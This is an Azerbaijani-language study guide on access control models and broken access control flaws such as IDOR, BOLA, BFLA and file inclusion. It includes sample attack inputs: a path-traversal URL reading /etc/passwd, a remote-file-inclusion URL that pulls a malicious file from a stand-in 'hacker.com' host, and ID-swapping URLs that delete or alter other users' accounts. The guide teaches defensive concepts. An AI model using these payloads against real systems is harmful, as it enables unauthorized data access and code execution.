# 🔐 Broken Access Control — Oxuma Materialı

> PDF-dəki bütün mövzular + əlavə izahlar  
> Sadə dildə, nümunələrlə

---

## 1. Giriş Nəzarəti (Access Control) nədir?

Giriş nəzarəti — **"kim, nəyə çata bilər?"** sualının cavabıdır.

Sistem iki şeyi yoxlayır:

| Proses | Sual | Nümunə |
|--------|------|--------|
| **Authentication (Autentifikasiya)** | Sən kimsin? | Login/şifrə ilə özünü təsdiqlə |
| **Authorization (Avtorizasiya)** | Nəyə icazən var? | Tələbə yalnız öz kurslarına baxa bilər |

Autentifikasiya tək başına kifayət etmir — ikisi birlikdə lazımdır.

---

## 2. Giriş Nəzarətinin Növləri

### 🔒 MAC — Məcburi Giriş Nəzarəti
Sistem özü qərar verir, istifadəçi dəyişdirə bilməz.

```
Fayl: "Top Secret"  +  İstifadəçi: "Secret" clearance  →  GİRİŞ YOX ❌
Fayl: "Secret"      +  İstifadəçi: "Top Secret" clearance → GİRİŞ VAR ✅
```

Hər faylın **2 etiketi** var: təsnifat (yüksək/orta/aşağı) + kateqoriya (hansı şöbə).
Hər ikisi uyğun gəlməsə — giriş yoxdur.

**İstifadəsi:** Hökumət, hərbi sistemlər. Ən sərt, ən təhlükəsiz.

---

### 👥 RBAC — Rol Əsaslı Giriş Nəzarəti
İstifadəçiyə **rol** verilir, rol icazə daşıyır.

```
Mühasib rolu  →  maliyyə məlumatlarına çatır
IT rolu       →  serverə çatır
Sales rolu    →  müştəri bazasına çatır
```

Vacib fərq: İstifadəçi bir neçə **qrupa** aid ola bilər, amma yalnız **bir rola** təyin edilir.

⚠️ **Rol sürünməsi (Role Creep):** Adam başqa şöbəyə keçir, köhnə rolunun icazələri onla qalır. Bunu vaxtında silmək lazımdır.

---

### 🧑‍💼 DAC — Diskresion Giriş Nəzarəti
Faylın **sahibi** özü icazə verir.

```
Sən fayl yaradırsan →
  Dostuna: oxuma icazəsi ver ✅
  Başqasına: icazə vermə ❌
```

ACL (Access Control List) — "bu faylı kimə vermişəm" siyahısı.
Windows fayl sistemləri DAC-dan istifadə edir.

---

### 📋 RB-RBAC — Qaydaya Əsaslanan Giriş Nəzarəti
Digər növlərə **əlavə** olaraq işləyir. Şərtlər uyğundursa icazə verir.

```
Qayda: Saat 17:00-dan sonra heç kim ofisə girə bilməz
→ Hətta menecer də gecə 2-də girə bilməz ❌
```

Firewall qaydaları, VPN politikaları — bu növdəndir.

---

### 🏷️ ABAC — Atribut Əsaslı Giriş Nəzarəti
Ən çevik sistem. **if-then** məntiqi ilə işləyir.

```
IF  şöbə=Maliyyə  AND  vəzifə=Mühasib  AND  cihaz=korporativ
THEN  maliyyə sənədlərini oxumağa icazə ver ✅
```

4 atribut kateqoriyası:

| Kateqoriya | Nə göstərir? | Nümunə |
|-----------|-------------|--------|
| İstifadəçi | Kim? | ad, vəzifə, şöbə |
| Resurs | Nə? | faylın növü, həssaslığı |
| Fəaliyyət | Nə etmək istəyir? | oxu, sil, redaktə et |
| Mühit | Harada/nə vaxt? | vaxt, yer, cihaz |

---

## 3. Broken Access Control nədir?

Giriş nəzarəti **düzgün işləmədikdə** — istifadəçi icazəsi olmayan resurslara çata bilir.

OWASP Top 10-da **#1** (2021-dən bəri ən kritik veb zəiflik).

**3 əsas növü var:**

```
Vertical Access Control    →  aşağı səviyyəli user, yuxarı funksiyaya çatır
Horizontal Access Control  →  eyni səviyyəli user, başqasının datasına çatır
Context-Dependent          →  yanlış ardıcıllıqla əməliyyat icra edilir
```

---

## 4. Vertical Access Control Pozuntusu

Normal istifadəçi **admin funksiyasına** çatır.

```
Normal:  user → /admin  →  403 Forbidden ❌
Pozuntu: user → /admin  →  200 OK ✅ (PROBLEM!)
```

**Nümunə — Admin URL-lərinə birbaşa giriş:**
```
https://target.com/admin
https://target.com/administrator
https://target.com/web_admin
```

Tətbiq bu URL-ləri menyuda göstərmir, amma daxil olmağa icazə verir — bu böyük səhvdir.

---

## 5. Horizontal Access Control Pozuntusu

Eyni səviyyəli istifadəçi **başqasının datasına** çatır.

```
Normal:  User A → öz datası ✅
Pozuntu: User A → User B-nin datası ✅ (PROBLEM!)
```

---

## 6. Context-Dependent Access Control

Əməliyyatlar **yanlış ardıcıllıqla** icra edilir.

```
Normal axın:
Səbətə əlavə et → Ödəniş et → Sifariş tamamlandı

Pozuntu:
Ödəniş et → Sonra səbəti dəyişdirməyə cəhd et → SİSTEM İCAZƏ VERİR ❌
```

E-ticarət saytlarında tez-tez olur.

---

## 7. IDOR — Təhlükəsiz Olmayan Birbaşa Obyekt İstinadı

**Insecure Direct Object Reference** — URL-dəki ID-ni dəyişib başqasının datasını görmək.

```
Öz səbətin:
https://target.com/viewCart.php?userID=1234

ID-ni dəyişirsən:
https://target.com/viewCart.php?userID=5678  →  başqasının səbəti görünür! 😱
```

IDOR varsa digər hücumlar da mümkündür:
```
https://target.com/deleteAccount.php?userID=5678   → hesabı sil
https://target.com/changeAddress.php?userID=5678   → ünvanı dəyiş
```

---

## 8. BOLA — Broken Object Level Authorization

IDOR-un API versiyasıdır. **Eyni problem, fərqli kontekst.**

```
GET /api/userInfo/1234   →  öz məlumatın ✅
GET /api/userInfo/5678   →  başqasının adı, emaili, kredit kartı 😱
```

Fərq:
- IDOR → köhnə veb tətbiqlər üçün istifadə edilən termin
- BOLA → müasir API-lər üçün OWASP API Top 10-da #1

---

## 9. BFLA — Broken Function Level Authorization

İstifadəçi **icazəsi olmayan funksiyaya** çatır.

```
Normal user API-si:
GET /api/users/my_info  →  yalnız öz məlumatın

Manipulyasiya:
GET /api/admins/all_info  →  bütün istifadəçilərin məlumatı 😱
```

```
ORIGINAL:  GET /api/users/v1/user/myinfo
TAMPERED:  GET /api/admins/v1/users/all
```

**BOLA vs BFLA fərqi:**

| | BOLA | BFLA |
|--|------|------|
| Problem | Yanlış **obyektə** çatır | Yanlış **funksiyaya** çatır |
| Nümunə | Başqasının sifarişini görür | Admin panelini açır |
| Növ | Horizontal (yan) | Vertical (yuxarı) |

---

## 10. MFLAC — Missing Function Level Access Control

Funksiya səviyyəsindəki giriş nəzarəti **tamamilə yoxdur.**

```
POST /account/edit.php    →  200 OK ✅  (normal - redaktə et)
POST /account/delete.php  →  200 OK ✅  (PROBLEM - silmə icazəsi yoxdu!)
```

Tətbiq bir əməliyyata icazə yoxlayır, amma digərinə yoxlamır.

---

## 11. LFI / RFI — Fayl Daxil Etmə Zəiflikləri

**LFI (Local File Inclusion)** — serverdəki faylı oxumaq:
```
http://example.com/getUserProfile.jsp?item=../../../../etc/passwd
```
`../../../../` — qovluqları geri keçir, `/etc/passwd` sistem faylını oxuyur.

**RFI (Remote File Inclusion)** — uzaq faylı serverə daxil etmək:
```
http://example.com/index.php?file=http://hacker.com/malicious.txt
```
Hacker öz serverindəki zərərli faylı hədəf serverdə işlədir.

---

## 12. Hamısını Bir Yerdə Görək

```
Broken Access Control (çətir anlayış)
├── Vertical pozuntu
│   ├── BFLA — yanlış funksiyaya çatmaq
│   └── MFLAC — funksiya səviyyəsi nəzarəti yoxdur
├── Horizontal pozuntu
│   ├── IDOR — URL-dəki ID-ni dəyişmək (köhnə termin)
│   └── BOLA — API-də obyekt səviyyəsi nəzarəti yoxdur
└── Context-Dependent
    └── Yanlış ardıcıllıqla əməliyyat
```

---

## 13. Real Dünya Nümunəsi

2024-cü ildə bir xəstəxananın patient portalında BOLA tapıldı — URL-dəki sənəd ID-sini dəyişməklə başqa xəstənin laboratoriya nəticələrini görmək mümkün idi. Bir xəstə təsadüfən yanlış URL yazanda bunu kəşf etdi.

---

## 14. Qısa Xülasə

| Termin | Sadə mənası |
|--------|-------------|
| **MAC** | Sistem qərar verir, istifadəçi dəyişdirə bilməz |
| **RBAC** | Roluna görə icazən var |
| **DAC** | Öz faylına özün icazə verirsən |
| **RB-RBAC** | Şərtlər uyğundursa icazə verilir |
| **ABAC** | Çoxlu atributlara əsasən qərar verilir |
| **BAC** | Giriş nəzarəti qırılıb — ümumi kateqoriya |
| **IDOR** | URL-dəki ID-ni dəyiş, başqasının datasını gör |
| **BOLA** | IDOR-un API versiyası |
| **BFLA** | Adi user admin funksiyasına çatır |
| **MFLAC** | Funksiya üçün heç bir nəzarət yoxdur |
| **LFI** | Serverdəki faylı oxu |
| **RFI** | Uzaq faylı serverə daxil et |

---

*Hazırlandı: 2026 | Mənbələr: OWASP, PortSwigger, Kurs PDF materialları*
